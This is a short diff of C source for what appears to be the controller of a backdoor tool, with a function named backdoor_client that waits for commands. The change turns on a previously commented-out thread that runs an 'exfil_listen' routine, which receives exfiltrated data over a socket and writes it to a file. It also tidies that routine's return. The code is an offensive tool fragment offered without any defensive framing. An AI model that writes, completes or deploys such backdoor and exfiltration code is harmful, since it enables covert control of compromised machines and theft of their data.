@@ -7,7 +7,6 @@
 #include <netinet/in.h>
 #include <sys/socket.h>
 
-#include "crypto.h"
 #include "client.h"
 #include "defs.h"
 #include "util.h"
@@ -44,7 +43,7 @@ void backdoor_client(uint32 ipaddr, int dport, int duplex)
 	}
 
 	// exfil thread
-	//pthread_create(&exfil_thread, NULL, exfil_listen, &saddr);
+	pthread_create(&exfil_thread, NULL, exfil_listen, &saddr);
 	
 
 	printf("Ready, awaiting your command...\n");
@@ -131,7 +130,7 @@ int val_port(int port)
 		return 0;
 }
 
-void *exfil_listen(void *arg)
+void* exfil_listen(void *arg)
 {
 	int sock;
 	char buf[MAX_LEN];
@@ -164,4 +163,6 @@ void *exfil_listen(void *arg)
 
 	fclose(file);
 	close(sock);
+
+	return NULL;
 }
